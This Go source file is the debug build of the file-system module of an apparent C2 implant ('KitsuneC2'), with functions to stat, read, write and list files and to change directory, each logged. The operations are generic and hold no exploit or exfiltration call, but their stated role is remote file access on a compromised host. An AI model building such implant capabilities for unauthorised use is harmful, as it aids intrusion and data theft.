//go:build debug

//This package contains all functions that an implant is able to perform. These functions usually get called through handlers.
//Only pure-go, platform independent modules should go in this file.

package modules

import (
	"KitsuneC2/lib/utils"
	"fmt"
	"io/fs"
	"log"
	"os"
	"strings"
	"time"
)

// Given a filepath, returns info about a file such as name, size etc.
func FileInfo(path string) (fs.FileInfo, error) {
	log.Printf("[START FILE INFO] on path %s\n", path)
	results, err := os.Stat(path)
	if err != nil {
		log.Printf("[ERROR FILE INFO] error: %s\n", err.Error())
		return nil, err
	}
	log.Printf("[SUCCESS FILE INFO] result: %v \n", results)
	return results, nil
}

// Writes file to specified location.
func WriteFile(file []byte, location string) error {
	log.Printf("[START WRITE FILE] destination: %s\n", location)
	err := utils.WriteFile(file, location)
	if err != nil {
		log.Printf("[ERROR WRITE FILE] error: %s\n", err.Error())
	} else {
		log.Printf("[SUCCESS WRITE FILE]\n")
	}
	return err
}

// Reads file from "path" and returns content as bytes
func ReadFile(path string) ([]byte, error) {
	log.Printf("[START READ FILE] source: %s\n", path)
	res, err := utils.ReadFile(path)
	if err != nil {
		log.Printf("[ERROR READ FILE] error: %s\n", err.Error())
	} else {
		log.Printf("[SUCCESS READ FILE] result: %s", string(res))
	}
	return res, err
}

// lists directory given on path
func Ls(path string) (string, error) {
	log.Printf("[START LS] path: %s\n", path)
	files, err := os.ReadDir(path)
	if err != nil {
		log.Printf("[ERROR LS] error: %s\n", err.Error())
		return "", err
	}
	var output *strings.Builder = new(strings.Builder)
	for _, file := range files {
		fileInf, _ := file.Info()
		fmt.Fprintf(output, "%s  %d  %s    %s\n", fileInf.Mode().String(), fileInf.Size(), fileInf.ModTime().Format(time.UnixDate), fileInf.Name())
	}
	log.Printf("[SUCCESS LS] result: %s\n", output.String())
	return output.String(), nil
}

// Changes current working directory to "path".
func Cd(path string) error {
	log.Printf("[START CD] path: %s\n", path)
	err := os.Chdir(path)
	if err != nil {
		log.Printf("[ERROR CD] error: %s\n", err.Error())
	} else {
		log.Printf("[SUCCESS CD]\n")
	}
	return err
}
